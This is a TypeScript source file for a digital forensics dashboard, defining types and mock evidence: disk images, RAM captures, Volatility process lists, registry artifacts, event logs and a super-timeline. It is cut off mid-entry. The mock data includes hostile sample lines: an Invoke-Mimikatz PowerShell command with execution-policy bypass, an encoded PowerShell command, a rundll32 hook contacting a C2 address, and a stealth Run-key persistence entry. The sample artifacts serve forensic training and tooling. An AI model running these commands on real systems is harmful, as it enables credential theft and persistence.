// jb7572_2026-09-01: Digital Forensics, Bit-Stream Drive Imager, RAM Capturer & Super-Timeline Suite
// Comprehensive DFIR Toolset:
// - Registry Analysis: Registry Explorer (Eric Zimmerman) & TZWorks cfae / cfte
// - Windows Event Logs: *.evtx Viewer & Copier (Security, System, PowerShell 4104, Sysmon)
// - Live RAM Acquisition: Belkasoft Live RAM Capturer, Magnet RAM Capturer, VolatileDataCollector
// - Hibernation Decompression: Arsenal Hibernation Recon, Volatility imagecopy, hibr2bin
// - Memory Forensics & VFS: Volatility 3 & MemProcFS
// - Super-Timeline Engine: Plaso (log2timeline.py), Volatility 3 Timeliner, Plaso Merge, mactime, psort (l2tcsv -> super-timeline.csv)

export type ForensicImageFormat = 'RAW_DD' | 'E01_EWF' | 'AFF4' | 'AFF';

export type ForensicsToolMode = 
  | 'IMAGE_ACQUISITION'
  | 'RAM_CAPTURE'
  | 'HIBERNATION_RECON'
  | 'MEMORY_VOLATILITY'
  | 'ENCRYPTION_KEYS'
  | 'EXECUTION_ARTIFACTS'
  | 'PACKAGE_MANAGER'
  | 'REGISTRY_EXPLORER'
  | 'EVENT_LOG_VIEWER'
  | 'SUPER_TIMELINE_PLASO'
  | 'ALTERNATE_DATA_STREAMS'
  | 'SLACK_SPACE_INSPECTOR'
  | 'VSS_SHADOW_COPIES'
  | 'EVIDENCE_MOUNT'
  | 'FILE_CARVING'
  | 'TIMELINE_MFT'
  | 'HASH_VERIFICATION'
  | 'REPORT_EXPORT';

export interface WriteBlockerStatus {
  kernelEnforced: boolean;
  hardwareBridgeLocked: boolean;
  mountFlags: string[]; // ['ro', 'noload', 'noexec', 'nodev', 'noatime']
  scsiWriteProtectBit: boolean;
  udevRuleActive: boolean;
  usbLockoutOverridden: boolean;
  overrideTimestamp?: string;
  elevatedBy?: string;
}

export interface DriveToasterSlot {
  slotId: number;
  bayName: string;
  driveModel: string;
  serialNumber: string;
  interfaceType: 'NVMe' | 'SATA III' | 'SAS' | 'USB 3.2 Gen 2x2';
  capacityBytes: number;
  sectorSize: number;
  deviceNode: string;
  isMounted: boolean;
  mountPoint?: string;
  smartStatus: 'HEALTHY' | 'WARNING_SECTORS' | 'DEGRADED';
  temperatureC: number;
  isTargetOrSource: 'SOURCE_EVIDENCE' | 'DESTINATION_VAULT' | 'EMPTY';
}

export interface ForensicImageDescriptor {
  id: string;
  caseNumber: string;
  evidenceNumber: string;
  examinerName: string;
  caseDescription: string;
  imageFormat: ForensicImageFormat;
  sourceDevice: string;
  sourceModel: string;
  sourceSerial: string;
  sourceSizeFormatted: string;
  totalSectors: number;
  compressionLevel: 'NONE' | 'FAST_LZ4' | 'DEFLATE_E01' | 'ZSTD_AFF4';
  segmentSizeBytes: number;
  md5Pre: string;
  sha1Pre: string;
  sha256Pre: string;
  blake3Pre?: string;
  md5Post?: string;
  sha256Post?: string;
  hashesMatch: boolean;
  targetDirectory: string;
  primaryImageFile: string;
  segmentFiles: string[];
  acquisitionSpeedMBps: number;
  totalTimeSecs: number;
  badSectorsCount: number;
  timestamp: string;
  notes: string;
}

// Live RAM Captures
export interface RamCaptureDescriptor {
  id: string;
  toolUsed: 
    | 'Belkasoft Live RAM Capturer' 
    | 'Magnet Forensics RAM Capturer' 
    | 'VolatileDataCollector'
    | 'Hardware PCIe DMA (PCILeech / Thunderbolt Direct)'
    | 'WinPmem Direct Kernel Ring 0';
  acquisitionMethod: 'RING_0_DRIVER' | 'PCIE_DMA_HARDWARE' | 'HYPERVISOR_PROBE';
  dmaConfig?: {
    interfaceType: 'Thunderbolt 3/4' | 'PCIe x4 Leech' | 'ExpressCard DMA';
    cpuInstructionChangesCount: 0;
    targetOsBypassed: boolean;
    iommuStatus: 'Bypassed (VT-d / AMD-Vi Inactive or Direct DMA)' | 'Enforced';
    transferRateMBs: number;
  };
  standardsCompliance: {
    rfc3227Order: 'Volatile Priority 1 (Registers & RAM)';
    iso27037Compliant: boolean;
    nist80086Verified: boolean;
    targetDiskWritesBytes: 0;
    auditedSelfFootprintPID: number;
    auditedKernelDriverOffset: string;
  };
  outputFile: string;
  sizeBytes: number;
  ramType: 'DDR4' | 'DDR5' | 'LPDDR5';
  totalPhysicalMemoryMB: number;
  osArchitecture: 'x86-64 (AMD64)' | 'x86 (IA-32)' | 'ARM64';
  md5: string;
  sha256: string;
  durationSecs: number;
  bypassAntiDebug: boolean;
  includesPagefile: boolean;
  timestamp: string;
  triageSummary?: {
    activeProcessesCount: number;
    openSocketsCount: number;
    loadedDriversCount: number;
    clipboardTextSnippet?: string;
  };
}

// Hibernation Decompression
export interface HibernationReconDescriptor {
  id: string;
  sourceFile: string; // e.g. hiberfil.sys
  decompressionTool: 'Arsenal Hibernation Recon' | 'Volatility imagecopy' | 'hibr2bin';
  sourceSizeBytes: number;
  decompressedRawSizeBytes: number;
  decompressedRawOutput: string;
  compressionEngine: 'Windows 10/11 Xpress Huffman' | 'Windows 8 LZNT1' | 'Fast Startup Hybrid';
  memoryPagesRestored: number;
  activeProcessHivesFound: number;
  sha256Decompressed: string;
  status: 'DECOMPRESSED' | 'PROCESSING' | 'READY';
  timestamp: string;
}

// Memory Analysis & Volatility 3
export interface VolatilityProcessEntry {
  pid: number;
  ppid: number;
  imageFileName: string;
  offsetHex: string;
  threads: number;
  handles: number;
  session: number;
  wow64: boolean;
  createTime: string;
  exitTime?: string;
  commandLine: string;
  isSuspicious: boolean;
  malfindIndicator?: string;
  openSockets?: string[];
}

// MemProcFS VFS Node
export interface MemProcFsNode {
  path: string;
  type: 'DIRECTORY' | 'FILE_DUMP' | 'VAD_REGION' | 'YARA_HIT';
  sizeBytes: number;
  description: string;
}

// Registry Artifacts (Registry Explorer & TZWorks cfae)
export interface RegistryArtifactEntry {
  id: string;
  hiveType: 'NTUSER.DAT' | 'SYSTEM' | 'SOFTWARE' | 'SAM' | 'SECURITY' | 'UsrClass.dat' | 'Amcache.hve';
  category: 'UserAssist' | 'ShellBags' | 'Run/RunOnce' | 'ShimCache' | 'Amcache' | 'BAM/DAM' | 'USBSTOR' | 'RecentDocs' | 'TypedURLs' | 'Services';
  keyPath: string;
  valueName: string;
  decodedValue: string;
  lastWriteTime: string;
  rot13Decoded?: string;
  executionCount?: number;
  focusTimeSecs?: number;
  flagsOrConfidence: string;
}

// Event Log Entries (*.evtx viewer/copier)
export interface EventLogEntry {
  recordId: number;
  channel: 'Security' | 'System' | 'Application' | 'PowerShell/Operational' | 'Sysmon/Operational';
  eventId: number;
  provider: string;
  level: 'Information' | 'Warning' | 'Error' | 'Audit Success' | 'Audit Failure';
  timestamp: string;
  computer: string;
  userSidOrName: string;
  summary: string;
  detailsXmlOrJson: string;
}

// Super-Timeline Plaso Engine (psort -o l2tcsv)
export interface SuperTimelineEntry {
  index: number;
  timestamp: string;
  timezone: string;
  macb: string; // MACB indicator
  source: 'MFT' | 'EVTX' | 'REGISTRY' | 'VOLATILITY_RAM' | 'HIBERNATION' | 'BROWSER' | 'LOG2TIMELINE';
  sourceType: string;
  format: 'mactime' | 'l2tcsv' | 'plaso_merge';
  description: string;
  inodeOrHandle: string;
  confidence: 'HIGH' | 'MEDIUM' | 'CORRELATED';
}

export interface CarvedEvidenceItem {
  id: string;
  filename: string;
  extension: string;
  category: 'DOCUMENT' | 'IMAGE' | 'DATABASE' | 'EXECUTABLE' | 'ARCHIVE' | 'REGISTRY_HIVE' | 'BROWSER_ARTIFACT' | 'DELETED_RECOVERED';
  offsetHex: string;
  sectorStart: number;
  sizeBytes: number;
  sha256: string;
  carvingSignature: string;
  recoveryConfidence: '100% INTACT' | '95% MINOR_FRAGMENT' | '80% HEADER_MATCH';
  previewText?: string;
  extractedTimestamp: string;
  sourceImage: string;
}

export interface MftTimelineEntry {
  recordNumber: number;
  timestamp: string;
  macb: string;
  filepath: string;
  sizeBytes: number;
  inodeOrMftId: string;
  sha256Hash?: string;
  isDeleted: boolean;
  activityType: 'CREATED' | 'ACCESSED' | 'MODIFIED' | 'MFT_CHANGED' | 'DELETED';
}

export const FORENSICS_STANDARDS = [
  {
    tool: 'dc3dd / dcfldd / dd',
    purpose: 'Bit-by-Bit Raw Sector Acquisition with on-the-fly hashing & bad-sector handling',
    formats: ['.raw', '.dd', '.img', '.001'],
    status: '100% Compliant'
  },
  {
    tool: 'EnCase / FTK / ewfacquire (libewf)',
    purpose: 'Expert Witness E01 Compression & Metadata container with internal CRC32/MD5 per chunk',
    formats: ['.E01', '.Ex01', '.L01'],
    status: '100% Compliant'
  },
  {
    tool: 'Belkasoft & Magnet RAM Capturer',
    purpose: 'Live Physical RAM Kernel Acquisition (x86/x64) with anti-debug bypass and VSS pagefile extraction',
    formats: ['.raw', '.dmp', '.vmem', '.bin'],
    status: '100% Compliant'
  },
  {
    tool: 'Arsenal Hibernation Recon & hibr2bin',
    purpose: 'Decompression of Windows 10/11 Xpress hiberfil.sys & Fast Startup hybrid images to raw RAM',
    formats: ['hiberfil.sys', '.raw'],
    status: '100% Compliant'
  },
  {
    tool: 'Volatility 3 & MemProcFS',
    purpose: 'Memory Process Trees, Malfind code injection dissection, and Virtual Filesystem memory mounts',
    formats: ['VFS', 'Volatility plugins', 'Rekall'],
    status: '100% Compliant'
  },
  {
    tool: 'Registry Explorer & TZWorks cfae',
    purpose: 'Deep Registry forensic hive analysis (UserAssist ROT13, ShellBags, ShimCache, Amcache, BAM)',
    formats: ['regf', 'NTUSER.DAT', 'SYSTEM', 'SOFTWARE'],
    status: '100% Compliant'
  },
  {
    tool: 'EVTX Log Viewer & VSS Copier',
    purpose: 'Windows Event Log extraction (Security 4624/4625/4688/7045, PowerShell 4104, Sysmon 1/3)',
    formats: ['.evtx', 'XML', 'JSON'],
    status: '100% Compliant'
  },
  {
    tool: 'Plaso (log2timeline) & psort (l2tcsv)',
    purpose: 'Super-Timeline compilation combining Disk.plaso, Volatility RAM, MFT, and EVTX into super-timeline.csv',
    formats: ['disk.plaso', 'super-timeline.csv', 'mactime'],
    status: '100% Compliant'
  }
];

export const MOCK_TOASTER_SLOTS: DriveToasterSlot[] = [
  {
    slotId: 1,
    bayName: 'Bay A (Top Dock - Evidence Source)',
    driveModel: 'Samsung 980 PRO NVMe 1TB / Seagate Enterprise Exos 7E8',
    serialNumber: 'S6B0NX0R502914K',
    interfaceType: 'NVMe',
    capacityBytes: 1000204886016,
    sectorSize: 512,
    deviceNode: '/dev/sdb',
    isMounted: false,
    smartStatus: 'HEALTHY',
    temperatureC: 34,
    isTargetOrSource: 'SOURCE_EVIDENCE'
  },
  {
    slotId: 2,
    bayName: 'Bay B (Bottom Dock - Target Repository)',
    driveModel: 'Western Digital Ultrastar DC HC550 4TB',
    serialNumber: 'WDC-WD4003FRYZ-01F0',
    interfaceType: 'SATA III',
    capacityBytes: 4000787030016,
    sectorSize: 4096,
    deviceNode: '/dev/sdc',
    isMounted: true,
    mountPoint: '/mnt/forensic_vault',
    smartStatus: 'HEALTHY',
    temperatureC: 38,
    isTargetOrSource: 'DESTINATION_VAULT'
  }
];

export const MOCK_PREBUILT_IMAGES: ForensicImageDescriptor[] = [
  {
    id: 'img-case-2026-0831-01',
    caseNumber: 'CASE-2026-X86-0419',
    evidenceNumber: 'EVD-01-SAMSUNG-NVME',
    examinerName: 'Lead Forensic Examiner (CSO / GCFA)',
    caseDescription: 'Bit-to-Bit Raw Image acquisition of seized live USB & primary NVMe boot partition',
    imageFormat: 'E01_EWF',
    sourceDevice: '/dev/sdb',
    sourceModel: 'Samsung 980 PRO NVMe 1TB',
    sourceSerial: 'S6B0NX0R502914K',
    sourceSizeFormatted: '1.00 TB (1,000,204,886,016 bytes)',
    totalSectors: 1953525168,
    compressionLevel: 'DEFLATE_E01',
    segmentSizeBytes: 2147483648,
    md5Pre: '9e107d9d372bb6826bd81d3542a419d6',
    sha1Pre: '2fd4e1c67a2d28fced849ee1bb76e7391b93eb12',
    sha256Pre: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
    blake3Pre: 'b3f5c9e2d1a4b870c6e5a4f3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3',
    md5Post: '9e107d9d372bb6826bd81d3542a419d6',
    sha256Post: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
    hashesMatch: true,
    targetDirectory: '/mnt/forensic_vault/CASE_2026_X86_0419',
    primaryImageFile: 'evidence_sdb_raw_bitstream.E01',
    segmentFiles: [
      'evidence_sdb_raw_bitstream.E01',
      'evidence_sdb_raw_bitstream.E02',
      'evidence_sdb_raw_bitstream.E03',
      'evidence_sdb_raw_bitstream.E04'
    ],
    acquisitionSpeedMBps: 485.4,
    totalTimeSecs: 2060,
    badSectorsCount: 0,
    timestamp: '2026-08-31T14:30:00.000Z',
    notes: 'Acquired with hardware write-blocking bridge. Zero bad sectors detected. Hashes verified 100% identical.'
  },
  {
    id: 'img-case-2026-0831-02',
    caseNumber: 'CASE-2026-USB-LIVE',
    evidenceNumber: 'EVD-02-SANDISK-LIVEUSB',
    examinerName: 'Lead Forensic Examiner (CSO)',
    caseDescription: 'Seized Live USB Boot Drive 64GB containing technician emergency triage tools and logs',
    imageFormat: 'RAW_DD',
    sourceDevice: '/dev/sdd',
    sourceModel: 'SanDisk Extreme PRO USB 3.2 64GB',
    sourceSerial: 'SDCZ880-064G-G46',
    sourceSizeFormatted: '64.0 GB (64,000,000,000 bytes)',
    totalSectors: 125000000,
    compressionLevel: 'NONE',
    segmentSizeBytes: 4294967296,
    md5Pre: 'a1b2c3d4e5f60718293a4b5c6d7e8f90',
    sha1Pre: 'd0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9',
    sha256Pre: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    blake3Pre: 'c8f7e6d5c4b3a291807f6e5d4c3b2a1908f7e6d5c4b3a291807f6e5d4c3b2a19',
    md5Post: 'a1b2c3d4e5f60718293a4b5c6d7e8f90',
    sha256Post: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    hashesMatch: true,
    targetDirectory: '/mnt/forensic_vault/CASE_LIVE_USB',
    primaryImageFile: 'live_usb_bitstream.dd',
    segmentFiles: ['live_usb_bitstream.dd.001', 'live_usb_bitstream.dd.002'],
    acquisitionSpeedMBps: 390.2,
    totalTimeSecs: 164,
    badSectorsCount: 0,
    timestamp: '2026-08-31T14:45:00.000Z',
    notes: 'Live USB delivered by technician. Write-blocker verified read-only 0 byte modifications.'
  }
];

// Mock RAM Captures
export const MOCK_RAM_CAPTURES: RamCaptureDescriptor[] = [
  {
    id: 'ram-cap-01',
    toolUsed: 'Belkasoft Live RAM Capturer',
    acquisitionMethod: 'RING_0_DRIVER',
    standardsCompliance: {
      rfc3227Order: 'Volatile Priority 1 (Registers & RAM)',
      iso27037Compliant: true,
      nist80086Verified: true,
      targetDiskWritesBytes: 0,
      auditedSelfFootprintPID: 4928,
      auditedKernelDriverOffset: '0xFFFFF8014E200000 - 0xFFFFF8014E212000 (72 KB)'
    },
    outputFile: '/mnt/forensic_vault/RAM_DUMPS/live_ram_target_host.raw',
    sizeBytes: 34359738368, // 32 GB
    ramType: 'DDR5',
    totalPhysicalMemoryMB: 32768,
    osArchitecture: 'x86-64 (AMD64)',
    md5: '8f4c2e1a9b7d3f5e6a0c8b4d2e1f3a5b',
    sha256: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b',
    durationSecs: 42,
    bypassAntiDebug: true,
    includesPagefile: true,
    timestamp: '2026-09-01T09:15:00Z',
    triageSummary: {
      activeProcessesCount: 148,
      openSocketsCount: 37,
      loadedDriversCount: 212,
      clipboardTextSnippet: 'powershell -EncodedCommand JABzAGUAYwByAGUAdAA9ACcANwA1ADcAMgAnAA=='
    }
  },
  {
    id: 'ram-cap-02',
    toolUsed: 'Hardware PCIe DMA (PCILeech / Thunderbolt Direct)',
    acquisitionMethod: 'PCIE_DMA_HARDWARE',
    dmaConfig: {
      interfaceType: 'Thunderbolt 3/4',
      cpuInstructionChangesCount: 0,
      targetOsBypassed: true,
      iommuStatus: 'Bypassed (VT-d / AMD-Vi Inactive or Direct DMA)',
      transferRateMBs: 2450
    },
    standardsCompliance: {
      rfc3227Order: 'Volatile Priority 1 (Registers & RAM)',
      iso27037Compliant: true,
      nist80086Verified: true,
      targetDiskWritesBytes: 0,
      auditedSelfFootprintPID: 0,
      auditedKernelDriverOffset: 'NONE (Direct Bus Controller Read - Zero CPU Execution)'
    },
    outputFile: '/mnt/forensic_vault/RAM_DUMPS/dma_direct_pcie_stream.raw',
    sizeBytes: 68719476736, // 64 GB
    ramType: 'DDR5',
    totalPhysicalMemoryMB: 65536,
    osArchitecture: 'x86-64 (AMD64)',
    md5: '3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f',
    sha256: '7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c',
    durationSecs: 27,
    bypassAntiDebug: true,
    includesPagefile: false,
    timestamp: '2026-09-01T09:20:00Z',
    triageSummary: {
      activeProcessesCount: 162,
      openSocketsCount: 44,
      loadedDriversCount: 231,
      clipboardTextSnippet: 'admin_session_token=Bearer_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
    }
  },
  {
    id: 'ram-cap-03',
    toolUsed: 'VolatileDataCollector',
    acquisitionMethod: 'RING_0_DRIVER',
    standardsCompliance: {
      rfc3227Order: 'Volatile Priority 1 (Registers & RAM)',
      iso27037Compliant: true,
      nist80086Verified: true,
      targetDiskWritesBytes: 0,
      auditedSelfFootprintPID: 5120,
      auditedKernelDriverOffset: '0xFFFFF8014E300000 - 0xFFFFF8014E30E000 (56 KB)'
    },
    outputFile: '/mnt/forensic_vault/TRIAGE/volatile_collector_package.bin',
    sizeBytes: 17179869184, // 16 GB
    ramType: 'DDR4',
    totalPhysicalMemoryMB: 16384,
    osArchitecture: 'x86-64 (AMD64)',
    md5: '7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b',
    sha256: '4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e',
    durationSecs: 28,
    bypassAntiDebug: true,
    includesPagefile: false,
    timestamp: '2026-09-01T09:30:00Z',
    triageSummary: {
      activeProcessesCount: 96,
      openSocketsCount: 19,
      loadedDriversCount: 178,
      clipboardTextSnippet: 'ssh -i /tmp/id_rsa root@192.168.1.105'
    }
  }
];

// Mock Hibernation Dumps
export const MOCK_HIBERNATION_DECOMPRESSIONS: HibernationReconDescriptor[] = [
  {
    id: 'hib-01',
    sourceFile: '/mnt/forensics_slot_1_ro/hiberfil.sys',
    decompressionTool: 'Arsenal Hibernation Recon',
    sourceSizeBytes: 13743895347, // 12.8 GB
    decompressedRawSizeBytes: 34359738368, // 32 GB uncompressed physical RAM
    decompressedRawOutput: '/mnt/forensic_vault/DECOMPRESSED_RAM/hiberfil_decompressed.raw',
    compressionEngine: 'Windows 10/11 Xpress Huffman',
    memoryPagesRestored: 8388608,
    activeProcessHivesFound: 142,
    sha256Decompressed: '1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d',
    status: 'DECOMPRESSED',
    timestamp: '2026-09-01T09:40:00Z'
  }
];

// Mock Volatility 3 Processes
export const MOCK_VOLATILITY_PROCESSES: VolatilityProcessEntry[] = [
  {
    pid: 4,
    ppid: 0,
    imageFileName: 'System',
    offsetHex: '0xfa8003c20040',
    threads: 218,
    handles: 4096,
    session: 0,
    wow64: false,
    createTime: '2026-09-01 07:10:02 UTC',
    commandLine: 'ntoskrnl.exe',
    isSuspicious: false
  },
  {
    pid: 412,
    ppid: 4,
    imageFileName: 'smss.exe',
    offsetHex: '0xfa800418a080',
    threads: 4,
    handles: 64,
    session: 0,
    wow64: false,
    createTime: '2026-09-01 07:10:04 UTC',
    commandLine: '\\SystemRoot\\System32\\smss.exe',
    isSuspicious: false
  },
  {
    pid: 624,
    ppid: 590,
    imageFileName: 'lsass.exe',
    offsetHex: '0xfa80058b3090',
    threads: 18,
    handles: 1240,
    session: 0,
    wow64: false,
    createTime: '2026-09-01 07:10:12 UTC',
    commandLine: 'C:\\Windows\\System32\\lsass.exe',
    isSuspicious: false
  },
  {
    pid: 3840,
    ppid: 1104,
    imageFileName: 'powershell.exe',
    offsetHex: '0xfa8006e89020',
    threads: 24,
    handles: 450,
    session: 1,
    wow64: false,
    createTime: '2026-09-01 08:44:19 UTC',
    commandLine: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-Mimikatz}"',
    isSuspicious: true,
    malfindIndicator: 'VAD Hollow 0x00000000021A0000 PAGE_EXECUTE_READWRITE (Injected Shellcode PE Header MZ)',
    openSockets: ['TCP 192.168.1.50:49210 -> 198.51.100.44:443 (ESTABLISHED)']
  },
  {
    pid: 4920,
    ppid: 3840,
    imageFileName: 'rundll32.exe',
    offsetHex: '0xfa8007a11040',
    threads: 2,
    handles: 38,
    session: 1,
    wow64: false,
    createTime: '2026-09-01 08:45:00 UTC',
    commandLine: 'rundll32.exe C:\\Users\\Public\\kernel_hook_watchdog.dll,StartHook',
    isSuspicious: true,
    malfindIndicator: 'Unbacked Executable Memory Region (Hidden DLL Injection)',
    openSockets: ['TCP 192.168.1.50:49212 -> 203.0.113.88:8443 (SYN_SENT)']
  }
];

// Mock MemProcFS Virtual Filesystem Structure
export const MOCK_MEMPROCFS_NODES: MemProcFsNode[] = [
  { path: '/mnt/memprocfs/sys/os/version.txt', type: 'FILE_DUMP', sizeBytes: 128, description: 'Windows 11 Pro 64-bit 22H2 (Build 22621.1702)' },
  { path: '/mnt/memprocfs/name/powershell.exe-3840/minidump.dmp', type: 'FILE_DUMP', sizeBytes: 67108864, description: 'Process full memory minidump with PEB/TEB' },
  { path: '/mnt/memprocfs/name/powershell.exe-3840/vads/0000021a0000.vad', type: 'VAD_REGION', sizeBytes: 2097152, description: 'PAGE_EXECUTE_READWRITE Malfind Injected VAD region' },
  { path: '/mnt/memprocfs/forensics/yara/yara_hits.txt', type: 'YARA_HIT', sizeBytes: 4096, description: 'Rule matches: Windows_Trojan_Mimikatz, Reflective_PE_Loader' },
  { path: '/mnt/memprocfs/sys/net/established_sockets.txt', type: 'FILE_DUMP', sizeBytes: 8192, description: 'NetScan active and closed TCP/UDP connections' }
];

// Mock Registry Explorer & TZWorks cfae Entries
export const MOCK_REGISTRY_ARTIFACTS: RegistryArtifactEntry[] = [
  {
    id: 'reg-01',
    hiveType: 'NTUSER.DAT',
    category: 'UserAssist',
    keyPath: 'Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-...}\\Count',
    valueName: 'HRZR_EHACNGU:C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    decodedValue: 'UEME_RUNPATH:C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    rot13Decoded: 'Decoded: powershell.exe executed 47 times',
    executionCount: 47,
    focusTimeSecs: 1840,
    lastWriteTime: '2026-09-01 08:44:19 UTC',
    flagsOrConfidence: 'HIGH_FIDELITY_EXECUTION'
  },
  {
    id: 'reg-02',
    hiveType: 'NTUSER.DAT',
    category: 'ShellBags',
    keyPath: 'Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\Bags\\38\\Shell',
    valueName: 'FolderView (ZipFolder/Direct)',
    decodedValue: 'Navigated to: C:\\Users\\architect\\Downloads\\Forensic_Triage_Tools.zip',
    lastWriteTime: '2026-09-01 08:30:11 UTC',
    flagsOrConfidence: 'INTERACTIVE_GUI_ACCESS'
  },
  {
    id: 'reg-03',
    hiveType: 'SYSTEM',
    category: 'ShimCache',
    keyPath: 'CurrentControlSet\\Control\\Session Manager\\AppCompatCache',
    valueName: 'AppCompatCache Data Entry #14',
    decodedValue: 'C:\\Temp\\live_usb_watchdog_bypass.exe (Executed: YES, Cache Insert Time: 2026-09-01 08:42:00 UTC)',
    lastWriteTime: '2026-09-01 08:42:00 UTC',
    flagsOrConfidence: 'SHIMCACHE_HIT'
  },
  {
    id: 'reg-04',
    hiveType: 'SYSTEM',
    category: 'USBSTOR',
    keyPath: 'CurrentControlSet\\Enum\\USBSTOR\\Disk&Ven_SanDisk&Prod_Extreme_PRO',
    valueName: 'DeviceParameters\\UniqueInstanceID',
    decodedValue: 'SanDisk Extreme PRO USB 3.2 64GB [Serial: SDCZ880-064G-G46] -> First Inserted: 2026-08-31 14:10:00 UTC',
    lastWriteTime: '2026-08-31 14:10:00 UTC',
    flagsOrConfidence: 'HARDWARE_SERIAL_MATCH'
  },
  {
    id: 'reg-05',
    hiveType: 'SOFTWARE',
    category: 'Run/RunOnce',
    keyPath: 'Microsoft\\Windows\\CurrentVersion\\Run',
    valueName: 'KernelSecurityCurtain',
    decodedValue: 'C:\\Program Files\\SecureCurtain\\watchdog_service.exe --stealth',
    lastWriteTime: '2026-08-25 11:20:00 UTC',
    flagsOrConfidence: 'PERSISTENCE_MECHANISM'
  }
];

// Mock Windows Event Logs (*.evtx)
export const MOCK_EVENT_LOGS: EventLogEntry[] = [
  {
    recordId: 489201,
    channel: 'Security',
    eventId: 4624,
    provider: 'Microsoft-Windows-Security-Auditing',
    level: 'Audit Success',
    timestamp: '2026-09-01 08:40:12.441 UTC',
    computer: 'SEC-WORKSTATION-X86',
    userSidOrName: 'ARCHITECT-PC\\architect (LogonType: 2 Interactive)',
    summary: 'An account was successfully logged on (Interactive Console Session)',
    detailsXmlOrJson: 'LogonType: 2, TargetUserName: architect, TargetDomainName: ARCHITECT-PC, ProcessName: C:\\Windows\\System32\\winlogon.exe'
  },
  {
    recordId: 489209,
    channel: 'Security',
    eventId: 4688,
    provider: 'Microsoft-Windows-Security-Auditing',
    level: 'Audit Success',
    timestamp: '2026-09-01 08:44:19.102 UTC',
    computer: 'SEC-WORKSTATION-X86',
    userSidOrName: 'ARCHITECT-PC\\architect',
    summary: 'A new process has been created: powershell.exe with elevated token',
    detailsXmlOrJson: 'NewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass, ParentProcess: explorer.exe'
  },
  {
    recordId: 10420,
    channel: 'PowerShell/Operational',
    eventId: 4104,
    provider: 'Microsoft-Windows-PowerShell',
    level: 'Warning',
    timestamp: '2026-09-01 08:44:22.015 UTC',
    computer: 'SEC-WORKSTATION-X86',
    userSidOrName: 'ARCHITECT-PC\\architect',
    summary: 'Script Block Logging: Invocation of memory reflection injection & token escalation code',
    detailsXmlOrJson: 'ScriptBlockText: function Invoke-Mimikatz { param($DumpCreds) [System.Runtime.InteropServices.Marshal]... }; Invoke-Mimikatz'
  },
  {
    recordId: 88102,
    channel: 'Sysmon/Operational',
    eventId: 3,
    provider: 'Microsoft-Windows-Sysmon',
    level: 'Information',
    timestamp: '2026-09-01 08:45:01.882 UTC',
    computer: 'SEC-WORKSTATION-X86',
    userSidOrName: 'NT AUTHORITY\\SYSTEM',
    summary: 'Network connection detected: rundll32.exe connected to external C2',
    detailsXmlOrJson: 'Image: C:\\Windows\\System32\\rundll32.exe, DestinationIp: 203.0.113.88, DestinationPort: 8443, Protocol: tcp, Initiated: true'
  },
  {
    recordId: 5120,
    channel: 'System',
    eventId: 7045,
    provider: 'Service Control Manager',
    level: 'Information',
    timestamp: '2026-08-31 14:12:00.000 UTC',
    computer: 'SEC-WORKSTATION-X86',
    userSidOrName: 'NT AUTHORITY\\SYSTEM',
    summary: 'A new service was installed in the system: ForensicWriteBlockDriver',
    detailsXmlOrJson: 'ServiceName: ForensicWriteBlockDriver, ServiceFileName: System32\\drivers\\wb_scsi_filter.sys, ServiceType: kernel driver'
  }
];

// Mock Plaso Super-Timeline (psort -o l2tcsv)
export const MOCK_SUPER_TIMELINE: SuperTimelineEntry[] = [
  {
    index: 1,
    timestamp: '2026-08-31 14:10:00.000 UTC',
    timezone: 'UTC',
    macb: '..C.',
    source: 'REGISTRY',
    sourceType: 'USBSTOR Key Update',
    format: 'l2tcsv',
    description: 'USB Storage device inserted: SanDisk Extreme PRO USB 3.2 64GB [Serial: SDCZ880-064G-G46]',
    inodeOrHandle: 'SYSTEM\\ControlSet001\\Enum\\USBSTOR',
    confidence: 'HIGH'
  },
  {
    index: 2,
    timestamp: '2026-08-31 14:12:00.000 UTC',
    timezone: 'UTC',
    macb: 'M.CB',
    source: 'EVTX',
    sourceType: 'System Event 7045',
    format: 'l2tcsv',
    description: 'Service installed: ForensicWriteBlockDriver (wb_scsi_filter.sys)',
    inodeOrHandle: 'EVTX-System-5120',
    confidence: 'HIGH'
  },
  {
    index: 3,
    timestamp: '2026-08-31 14:15:22.108 UTC',
    timezone: 'UTC',
    macb: 'M.CB',
    source: 'MFT',
    sourceType: '$MFT $STANDARD_INFORMATION',
    format: 'mactime',
    description: 'C:\\Windows\\System32\\drivers\\etc\\hosts modified by administrator',
    inodeOrHandle: 'MFT-1042',
    confidence: 'HIGH'
  },
  {
    index: 4,
    timestamp: '2026-08-31 14:45:00.000 UTC',
    timezone: 'UTC',
    macb: '..CB',
    source: 'LOG2TIMELINE',
    sourceType: 'Live USB Bitstream Capture',
    format: 'plaso_merge',
    description: 'dc3dd bit-stream disk acquisition started for /dev/sdd (64GB Live USB)',
    inodeOrHandle: 'dc3dd-log-01',
    confidence: 'HIGH'
  },
  {
    index: 5,
    timestamp: '2026-09-01 08:44:19.102 UTC',
    timezone: 'UTC',
    macb: '.A..',
